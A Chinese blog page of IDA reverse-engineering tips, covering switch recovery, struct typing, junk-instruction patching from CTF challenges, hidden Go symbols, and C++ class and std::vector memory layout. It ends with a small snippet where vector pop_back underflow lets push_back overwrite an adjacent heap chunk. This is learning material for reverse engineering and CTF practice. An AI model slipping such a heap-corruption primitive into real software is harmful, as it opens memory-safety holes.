class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_OTHER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_USER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>






        <h1 id="参考："   >
          <a href="#参考：" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1>
      <p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9" >原创] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/04/22/IDA%E9%80%86%E5%90%91%E6%8A%80%E5%B7%A7/">IDA逆向技巧</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-04-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、修复switch"   >
          <a href="#一、修复switch" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、修复switch" class="headerlink" title="一、修复switch"></a>一、修复switch</h1>
      <p>C++程序用IDA打开好多都不能将switch识别成功，常常需要修复：</p>

        <h2 id="1-找到跳转地址"   >
          <a href="#1-找到跳转地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-找到跳转地址" class="headerlink" title="1.找到跳转地址"></a>1.找到跳转地址</h2>
      <p>常常反汇编之后如下，这个基本就是无法识别switch的时候了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123; jmp     rax &#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-汇编修改"   >
          <a href="#2-汇编修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-汇编修改" class="headerlink" title="2.汇编修改"></a>2.汇编修改</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906161913.png" alt="Snipaste_2021-09-06_16-18-58"></p>
<p>进入到<strong>unk_41D4</strong>，里面放着对应的跳转数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906165238.png" alt="image-20210906165238427"></p>
<p>按d以4字节为一组对应修改为如下，可见跳转数量有6个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906165539.png" alt="image-20210906165538977"></p>
<p>然后对应修改数据</p>
<p><strong>Edit-&gt;Other-&gt;Specify switch idiom</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906164744.png" alt="Snipaste_2021-09-06_16-47-27"></p>
<p>打开之后修改对应数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906170243.png" alt="image-20210906170243406"></p>
<p>其中默认跳转位置可以通过调试看输入其他的选项的跳转位置。</p>

        <h1 id="二、结构体修复"   >
          <a href="#二、结构体修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、结构体修复" class="headerlink" title="二、结构体修复"></a>二、结构体修复</h1>
      
        <h2 id="1-Local-Type插入"   >
          <a href="#1-Local-Type插入" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Local-Type插入" class="headerlink" title="1.Local Type插入"></a>1.Local Type插入</h2>
      <p><strong>View-&gt;Open subviews-&gt;Local_types</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906170904.png" alt="image-20210906170904828"></p>
<p>右键Insert输入对应结构体即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906172736.png" alt="image-20210906172736186"></p>

        <h2 id="2-修改为指针"   >
          <a href="#2-修改为指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-修改为指针" class="headerlink" title="2.修改为指针"></a>2.修改为指针</h2>
      <p>在对应变量按y修改为对应指针</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906172907.png" alt="image-20210906172907718"></p>

        <h1 id="三、反汇编解析错误"   >
          <a href="#三、反汇编解析错误" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、反汇编解析错误" class="headerlink" title="三、反汇编解析错误"></a>三、反汇编解析错误</h1>
      
        <h2 id="1-花指令"   >
          <a href="#1-花指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-花指令" class="headerlink" title="1.花指令"></a>1.花指令</h2>
      <p>IDA中调试出现如下错误，或者观察也知道</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211203163504.png" alt="image-20211203163504409"></p>
<p>这时候可能出现花指令，使得IDA无法正常识别，再往下走IDA跳转到<code>0x40102f</code>，则证明<code>0x40102c~0x40102e</code>这三个字节码都是无效的，直接nop掉，然后<code>patch</code>之后重新打开IDA即可正常识别</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211203164003.png" alt="image-20211203164003865"></p>
<p>以<code>2020De1CTF-mixture</code>为例，IDA打开找到zif_类函数，可以看到堆栈指针问题</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151145621.png" alt="image-20220215114506575"></p>
<p>那么可能存在花指令或其他的影响，可以参考如下两种方法</p>

        <h3 id="1-堆栈寄存器"   >
          <a href="#1-堆栈寄存器" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆栈寄存器" class="headerlink" title="(1)堆栈寄存器"></a>(1)堆栈寄存器</h3>
      <p>首先考虑调试看看堆栈寄存器的变化，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151204618.png" alt="image-20220215120401490"></p>
<p>可以看到，在执行从0x122E~0x124D这个代码块之前和之后的寄存器除了rip其他都没有改变。</p>
<p>栈环境除了rsp的值被改变了其他的没有什么影响，而对于栈来说，主要就是栈指针的移动和传入参数的压栈，首先栈指针并没有发生改变，在考虑传入参数的压栈。</p>
<p>传入的参数为如下两个参数rdi和rsi，并且最开始的汇编代码并没有对rdi和rsi进行操作，那么这段代码块就等于无效，相当于就是一个<code>jz 0x124e</code>，那么我们直接给他nop掉即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151214636.png" alt="image-20220215121425597"></p>

        <h3 id="2-看汇编"   >
          <a href="#2-看汇编" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-看汇编" class="headerlink" title="(2)看汇编"></a>(2)看汇编</h3>
      <p>0x122e~0x124d如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151221701.png" alt="image-20220215122155647"></p>
<p>可以发现，call l2之后，l2函数通过rax把l2函数的返回地址+8了，也就是从0x1245变成了0x124d，那么就等同于如下代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000122E                 push    rax</span><br><span class="line">.text:000000000000122F                 xor     rax, rax</span><br><span class="line"></span><br><span class="line">.text:0000000000001236                 pop     rax</span><br><span class="line">.text:0000000000001237                 mov     [rsp+98h+arg], 0</span><br><span class="line">.text:000000000000123F                 push    rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000000124D                 pop     rax</span><br></pre></td></tr></table></div></figure>

<p>这不就相当于啥也没做吗，只是有个<code>mov     [rsp+98h+arg], 0</code>操作而已，但是也不影响参数，等同没有。</p>
<p>之后的0x131E~0x132D也是一样的错误，直接nop掉即可。之后即可正常F5</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151250416.png" alt="image-20220215125030353"></p>

        <h1 id="四、go语言隐藏"   >
          <a href="#四、go语言隐藏" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、go语言隐藏" class="headerlink" title="四、go语言隐藏"></a>四、go语言隐藏</h1>
      <p>虎符杯2022 gogogo</p>
<p>现有插件或者IDA7.6对go的符号恢复是基于gopclntab段上保留的函数符号，那么如果将该段上的符号函数进行修改或者隐藏，就不太容易逆向了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203241748490.png" alt="image-20220324174816395"></p>
<p>该题就是将main.main和math.init符号表替换，然后在main.main中设置一些原本main函数输入0x12345678退出的功能，使得逆向时我们认为main.main函数就只有这个功能，并没有其他功能，导致无法进行漏洞分析，修改回来就可以了，直接改这个表<code>.gopclntab</code>即可</p>

        <h1 id="五、C-逆向"   >
          <a href="#五、C-逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、C-逆向" class="headerlink" title="五、C++逆向"></a>五、C++逆向</h1>
      
        <h2 id="1-自定义的类"   >
          <a href="#1-自定义的类" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-自定义的类" class="headerlink" title="1.自定义的类"></a>1.自定义的类</h2>
      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">   <span class="built_in">A</span>()&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A::A()\n&quot;</span>);</span><br><span class="line">    id = <span class="number">42</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Virtual A::a()\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">virtual</span> ~<span class="built_in">A</span>()&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;A::~A()\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">B</span>()&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;B::B()\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">B</span>()&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;B::~B()\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Virtual B::a()\n&quot;</span>);</span><br><span class="line">      A::<span class="built_in">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Virtual B::b()\n&quot;</span>);</span><br><span class="line">        A::<span class="built_in">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h3 id="1-类的内存分布"   >
          <a href="#1-类的内存分布" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-类的内存分布" class="headerlink" title="(1)类的内存分布"></a>(1)类的内存分布</h3>
      
        <h4 id="①没有父类的"   >
          <a href="#①没有父类的" class="heading-link"><i class="fas fa-link"></i></a><a href="#①没有父类的" class="headerlink" title="①没有父类的"></a>①没有父类的</h4>
      <p>用上述代码的<code>class A</code>来举例</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(14).png" alt="未命名文件 (14)"></p>
<p>在调用构造函数<code>A::A()</code>之前会从堆里申请一块空间，即<code>class A</code>的空间，包括指针和成员。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423210047186.png" alt="image-20220423210047186"></p>
<p>在<code>A::A()</code>构造函数调用之后会初始化该堆空间，申请的堆空间如下。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423212133886.png" alt="image-20220423212133886"></p>
<p>然后还需要注意的是有两个函数指针，析构函数指针1和析构函数指针2，其中析构函数指针2是实际的用来释放空间的函数，即原始的析构函数，并且其中会调用到析构函数指针1，即用户自定义的析构函数相关的代码，并且地址是连在一起的，如下所示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423211833831.png" alt="image-20220423211833831"></p>

        <h4 id="②有父类的"   >
          <a href="#②有父类的" class="heading-link"><i class="fas fa-link"></i></a><a href="#②有父类的" class="headerlink" title="②有父类的"></a>②有父类的</h4>
      <p>以上述代码的<code>class B</code>来举例</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(15).png" alt="未命名文件 (15)"></p>
<p>其他的和没有父类的class也是差不多的。</p>

        <h4 id="③未申请空间的类"   >
          <a href="#③未申请空间的类" class="heading-link"><i class="fas fa-link"></i></a><a href="#③未申请空间的类" class="headerlink" title="③未申请空间的类"></a>③未申请空间的类</h4>
      <p>比如<code>A obj_a;</code>这种写法，那么其<code>public</code>的成员会变成栈上的变量，<code>private</code>成员无法访问，访问其成员函数还是在.text段上对应的。</p>

        <h3 id="2-常规写法"   >
          <a href="#2-常规写法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-常规写法" class="headerlink" title="(2)常规写法"></a>(2)常规写法</h3>
      <ul>
<li><p><code>A *point_obj_A = new A;</code> ：会调用A的构造函数</p>
<p><code>A *point_obj_A = new(A);</code> ：同上，一样的</p>
</li>
<li><p><code>A obj_A;</code> ：A的构造函数调用之后，如果没有其他的操作，那么程序会自动释放该对象，调用析构函数，相当于局部变量。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423173148441.png"></p>
</li>
<li><p><code>B *point_obj_b = new B;</code>会先调用A的构造函数，然后再调用B的构造函数，和前面的指针没有太多关系，直接<code>B obj_B</code>也是一样的</p>
</li>
<li><p><code>A *point_obj_b = new B;</code>一样的，只是将<code>point_obj_b </code>标记为类型为A的指针，但是这样的话该对象指针<code>point_obj_b</code>就不能调用到子类B的函数<code>b()</code>了。(子类指针可以调用父类的函数，但是父类指针不能调用子类的特有函数)</p>
</li>
</ul>

        <h2 id="2-容器类Vector"   >
          <a href="#2-容器类Vector" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-容器类Vector" class="headerlink" title="2.容器类Vector"></a>2.容器类Vector</h2>
      
        <h3 id="1-容器创建"   >
          <a href="#1-容器创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-容器创建" class="headerlink" title="(1)容器创建"></a>(1)容器创建</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176870" >C++逆向之容器vector篇入门 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="①声明容器"   >
          <a href="#①声明容器" class="heading-link"><i class="fas fa-link"></i></a><a href="#①声明容器" class="headerlink" title="①声明容器"></a>①声明容器</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对应IDA代码</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(v8, argv, envp);</span><br></pre></td></tr></table></div></figure>

<p>这个不造成堆空间的分配</p>

        <h4 id="②声明并初始化大小"   >
          <a href="#②声明并初始化大小" class="heading-link"><i class="fas fa-link"></i></a><a href="#②声明并初始化大小" class="headerlink" title="②声明并初始化大小"></a>②声明并初始化大小</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">test2</span><span class="params">(<span class="number">5</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对应IDA代码</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(v13);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(v9, <span class="number">5LL</span>, v13);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(v13);</span><br></pre></td></tr></table></div></figure>

<p>这个在调用vector的构造函数时，会有堆空间的申请，用来存放容器内的数据，依据定义的大小来进行申请，比如这里就申请了5个int的变量，那么大小为5*4=20个字节，对应在堆空间里就需要申请0x20大小的堆块来存放。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424112805438.png" alt="image-20220424112805438"></p>
<p>使用malloc来申请</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424112952718.png" alt="image-20220424112952718"></p>

        <h4 id="③声明并初始化大小和值"   >
          <a href="#③声明并初始化大小和值" class="heading-link"><i class="fas fa-link"></i></a><a href="#③声明并初始化大小和值" class="headerlink" title="③声明并初始化大小和值"></a>③声明并初始化大小和值</h4>
      <p>容量+初始值模式</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">test3</span><span class="params">(<span class="number">10</span>,<span class="number">1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对应IDA代码</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(v12);</span><br><span class="line">v13[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(v10, <span class="number">10LL</span>, v13, v12);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(v12);</span><br></pre></td></tr></table></div></figure>

<p>可以看到也是类似的，会创建一个局部变量v13作为初始值1传入vector的构造函数，并且申请堆空间后会进行初始化，所需大小为10*4=40个字节，对应0x30的堆空间，并且会初始化为1，如下所示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424113519816.png" alt="image-20220424113519816"></p>
<p>相关寄存器如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424120832499.png" alt="image-20220424120832499"></p>

        <h4 id="④使用地址进行初始化"   >
          <a href="#④使用地址进行初始化" class="heading-link"><i class="fas fa-link"></i></a><a href="#④使用地址进行初始化" class="headerlink" title="④使用地址进行初始化"></a>④使用地址进行初始化</h4>
      <p>Begin+End模式</p>
<p>这里区别于之前的传值，即容量的值以及初始值的地址，取而代之的是数据的起始地址和结束地址。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入test3在堆申请的存放数据的起始堆地址和结束堆地址，依据这段数据来进行初始化</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">test5</span><span class="params">(test3.begin(), test3.end())</span></span>;</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//对应的传入两个地址进行初始化，即array的相关数据处的地址</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">test6</span><span class="params">(&amp;<span class="built_in">array</span>[<span class="number">1</span>], &amp;<span class="built_in">array</span>[<span class="number">4</span>])</span></span>;</span><br><span class="line">getchar();</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"><span class="comment">//对应IDA代码</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(v17, <span class="number">1LL</span>, v5);</span><br><span class="line">v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::end(v14);</span><br><span class="line">v7 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::begin(v14);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">void</span>&gt;(v16, v7, v6, v17);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(v17);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v17[<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">v18[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">v18[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">v18[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">v19 = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v10, v7, v8);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>&lt;<span class="keyword">int</span> *,<span class="keyword">void</span>&gt;(v17, v18, &amp;v19, &amp;v10);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v10);</span><br><span class="line">getchar();</span><br></pre></td></tr></table></div></figure>

<p>相关寄存器如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424120944256.png" alt="image-20220424120944256"></p>
<p>栈上的数组模式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424121023804.png" alt="image-20220424121023804"></p>

        <h4 id="⑤总结"   >
          <a href="#⑤总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑤总结" class="headerlink" title="⑤总结"></a>⑤总结</h4>
      <p>主要就是关注<code>vector</code>的构造函数</p>
<ul>
<li><p>未初始化的只有<code>vector</code>构造函数</p>
</li>
<li><p>初始化容量或者值的，就会调用<code>allocator</code>来为容器进行分配，并且在<code>vector</code>的构造函数调用时会从堆上分配空间。</p>
</li>
<li><p>在IDA中的<code>vector</code>的构造函数中</p>
<ul>
<li><p>参数一(RDI寄存器)：即栈上保存<code>vector</code>变量的栈地址，指向申请的堆空间地址。后面传入<code>vector</code>的析构函数进行销毁。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424143520190.png" alt="image-20220424143520190"></p>
<p>其中的Begin和End是有效数据的地址范围，下面的那个地址是该容器申请的堆空间的末尾地址。</p>
</li>
<li><p>参数二(RSI寄存器)：容量+初值模式就传入容量的值，Begin+End模式就传入Begin处的地址。</p>
</li>
<li><p>参数三(RDX寄存器)：容量+初值模式就传入初值的地址，Begin+End模式就传入End处的地址。没有就为<code>allocator</code>的参数。</p>
</li>
<li><p>参数四(RCX寄存器)：一般为<code>allocator</code>的参数，没有初值的时候就在参数三中。</p>
</li>
</ul>
</li>
<li><p>最后会自动调用析构函数，传入构造函数创建时保存堆空间指针的栈地址。</p>
</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v17);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v16);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v15);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v14);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v13);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v12);</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-容器操作"   >
          <a href="#2-容器操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-容器操作" class="headerlink" title="(2)容器操作"></a>(2)容器操作</h3>
      <p>主要关注<code>push_back</code>和<code>pop_back</code></p>
<ul>
<li><p><code>push_back</code>：</p>
<ul>
<li>参数一：栈上保存申请堆空间指针的栈地址</li>
<li>参数二：要压入<code>vector</code>的值</li>
</ul>
<p>如果空间超过申请的堆空间大小，会free掉当前堆空间，然后malloc申请比之前大小的两倍减去0x10的大小。比如当前空间为0x50，那么扩容之后就是0x50*2-0x10的大小。</p>
</li>
<li><p><code>pop_back</code>：</p>
<ul>
<li>参数：栈上保存申请堆空间指针的栈地址</li>
</ul>
<p>只会修改之前提到的End地址，pop完之后如果接着pop则End会接着减少，会小于Begin的地址。</p>
</li>
</ul>
<p>这里就存在漏洞了，就是如果接着pop会导致End不断减少，当小于Begin的地址时，这时候再push_back的话，就会在小于Begin地址处写入数据，导致堆块数据被重写，如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>; i++)</span><br><span class="line">    test.push_back(i);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">    test.pop_back();</span><br><span class="line">getchar();</span><br><span class="line">test.push_back(<span class="number">0x50</span>);</span><br></pre></td></tr></table></div></figure>

<p>这样就会导致上一个堆块的数据被覆盖为0x50</p>
